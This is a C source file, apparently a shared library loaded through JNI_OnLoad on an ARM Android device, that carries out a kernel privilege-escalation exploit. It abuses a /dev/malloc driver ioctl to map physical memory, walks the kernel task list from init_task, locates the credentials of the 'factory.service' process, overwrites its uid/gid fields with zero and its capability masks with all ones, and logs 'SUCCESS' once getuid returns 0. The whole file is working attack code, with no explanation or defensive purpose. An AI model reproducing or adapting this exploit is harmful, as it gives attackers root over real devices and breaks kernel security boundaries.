typedef unsigned char u8;
typedef unsigned int u32;
typedef unsigned long long u64;
#define SYS_open 5
#define SYS_ioctl 54
#define SYS_mmap2 192
#define SYS_munmap 91
#define SYS_write 4
#define SYS_close 6
#define SYS_fork 2
#define SYS_wait4 114
#define SYS_exit 1
#define SYS_getuid 199
static long sc(long n,long a,long b,long c,long d,long e,long f){
 register long r7 __asm__("r7")=n; register long r0 __asm__("r0")=a;
 register long r1 __asm__("r1")=b; register long r2 __asm__("r2")=c;
 register long r3 __asm__("r3")=d; register long r4 __asm__("r4")=e;
 register long r5 __asm__("r5")=f;
 __asm__ volatile("svc 0":"+r"(r0):"r"(r7),"r"(r1),"r"(r2),"r"(r3),"r"(r4),"r"(r5):"memory");
 return r0;
}
static long lg=-1;
static void put(const char*s){int n=0;while(s[n])n++;if(lg>=0)sc(SYS_write,lg,(long)s,n,0,0,0);}
static void hx(u64 v){char b[19];int i;for(i=0;i<16;i++){int d=(v>>((15-i)*4))&15;b[i]=d<10?48+d:87+d;}b[16]=10;b[17]=0;put(b);}
static void dec(long v){char b[24];int i=23;b[23]=0;if(v==0){put("0");return;}int neg=0;if(v<0){neg=1;v=-v;}while(v){b[--i]=48+v%10;v/=10;}if(neg)b[--i]=45;put(b+i);}
static int mcmp(const unsigned char*a,const unsigned char*b,int n){int i;for(i=0;i<n;i++)if(a[i]!=b[i])return 1;return 0;}
struct info {u64 addr;u64 size;u64 interval;u8 miusel;u8 pad[7];};
#define MPOOL_IOC_SET 0x80204d04u
#define PAGE_OFFSET 0xffffff8000000000ULL
#define KIMAGE_VOFFSET 0xffffff7fe7d82000ULL
static unsigned long map_phys(long fd,u64 phys,u64 size){
 if(phys<0x20000000ULL)return 0;
 struct info in; in.addr=phys-0x20000000ULL;in.size=size;in.interval=0;in.miusel=0;in.pad[0]=0;
 if(sc(SYS_ioctl,fd,MPOOL_IOC_SET,(long)&in,0,0,0))return 0;
 long p=sc(SYS_mmap2,0,size,3,1,fd,0);
 if((unsigned long)p>=0xfffff000UL)return 0;
 return (unsigned long)p;
}
static int write_cred(long fd,u64 cp){
 unsigned long p=map_phys(fd,cp,0x1000); if(!p)return 0;
 unsigned char *b=(unsigned char*)p; int i,j,found=0;
 for(i=0;i<=0x100;i+=4){ for(j=0;j<8;j++) if(*(u32*)(b+i+j*4)!=1000) break; if(j==8){found=1;break;} }
 if(found){
  put("PAT ");hx(cp+i);put("\n");
  for(j=0;j<8;j++) *(u32*)(b+i+j*4)=0;
  *(u32*)(b+i+32)=0;
  for(j=36;j<76;j+=4) *(u32*)(b+i+j)=0xffffffffu;
 }
 sc(SYS_munmap,p,0x1000,0,0,0,0);
 return found;
}
static void child(long fd,u64 imgbase,u64 imgsize){
 unsigned long mp=map_phys(fd,imgbase,imgsize); if(!mp)sc(SYS_exit,2,0,0,0,0,0);
 unsigned char *b=(unsigned char*)mp; u64 i;
 for(i=0;i+16<imgsize;i++){
  if(mcmp(b+i,(const unsigned char*)"swapper/0",9))continue;
  u64 initphys=imgbase+i-0x5e8;
  if(initphys<imgbase)continue;
  unsigned long ip=map_phys(fd,initphys&~0xfffULL,0x1000); if(!ip)continue;
  unsigned char *pb=(unsigned char*)ip; u64 off=initphys&0xfff;
  u64 cred=*(u64*)(pb+off+0x5e0); u64 rcred=*(u64*)(pb+off+0x5d8);
  put("INIT ");hx(initphys);put(" cred ");hx(cred);put(" rc ");hx(rcred);put("\n");
  if(cred==rcred){
   u64 initvirt=initphys+KIMAGE_VOFFSET; int o,foundo=-1; u64 nextv=0;
   for(o=0;o<0x800;o+=8){
    u64 nv=*(u64*)(pb+off+o); if(nv<PAGE_OFFSET)continue;
    if(nv>=PAGE_OFFSET && nv<PAGE_OFFSET+0x92000000ULL){
      u64 np=nv-PAGE_OFFSET; unsigned long pp=map_phys(fd,np&~0xfffULL,0x1000); if(!pp)continue;
      u64 pv=*(u64*)((unsigned char*)pp+(np&0xfff)+8); sc(SYS_munmap,pp,0x1000,0,0,0,0);
      if(pv==initvirt+o){foundo=o;nextv=nv;break;}
    }
   }
   put("tasksoff ");dec(foundo);put("\n");
   if(foundo>=0){
    u64 listv=initvirt+foundo; int count=0;
    while(nextv!=listv && count<1000){
      u64 tv=nextv-foundo; u64 tp=tv-PAGE_OFFSET;
      if(tp<0x20000000ULL || tp>=0x92000000ULL)break;
      unsigned long tpp=map_phys(fd,tp&~0xfffULL,0x1000); if(!tpp)break;
      unsigned char *tb=(unsigned char*)tpp; u64 toff=tp&0xfff;
      if(!mcmp(tb+toff+0x5e8,(const unsigned char*)"factory.service",15)){
        u64 cv=*(u64*)(tb+toff+0x5e0); put("TASK ");hx(tp);put(" cred ");hx(cv);put("\n");
        if(cv>=PAGE_OFFSET && cv<PAGE_OFFSET+0x92000000ULL){
          if(write_cred(fd,(cv-PAGE_OFFSET)&~0xfffULL)){
            put("UID ");dec(sc(SYS_getuid,0,0,0,0,0,0));put("\n");
            if(sc(SYS_getuid,0,0,0,0,0,0)==0){put("SUCCESS\n");sc(SYS_exit,42,0,0,0,0,0);}
          }
        }
      }
      u64 nphys=nextv-PAGE_OFFSET; unsigned long npp=map_phys(fd,nphys&~0xfffULL,0x1000); if(!npp)break;
      nextv=*(u64*)((unsigned char*)npp+(nphys&0xfff)); sc(SYS_munmap,npp,0x1000,0,0,0,0);
      sc(SYS_munmap,tpp,0x1000,0,0,0,0);
      count++;
    }
   }
  }
  sc(SYS_munmap,ip,0x1000,0,0,0,0);
 }
 sc(SYS_munmap,mp,imgsize,0,0,0,0);
 sc(SYS_exit,1,0,0,0,0,0);
}
__attribute__((visibility("default"))) int JNI_OnLoad(void*a,void*b){
 lg=sc(SYS_open,(long)"/data/data/com.cvte.factory.service/files/taskcred.log",0x241,0644,0,0,0);
 put("start uid=");dec(sc(SYS_getuid,0,0,0,0,0,0));put("\n");
 long fd=sc(SYS_open,(long)"/dev/malloc",2,0,0,0,0); put("fd=");dec(fd);put("\n");
 if(fd<0)return 0x10006;
 long pid=sc(SYS_fork,0,0,0,0,0,0);
 if(pid==0)child(fd,0x20200000ULL,0x1400000ULL);
 int st=0;sc(SYS_wait4,pid,(long)&st,0,0,0,0);
 put("st=");dec(st);put(" uid=");dec(sc(SYS_getuid,0,0,0,0,0,0));put("\n");
 return 0x10006;
}
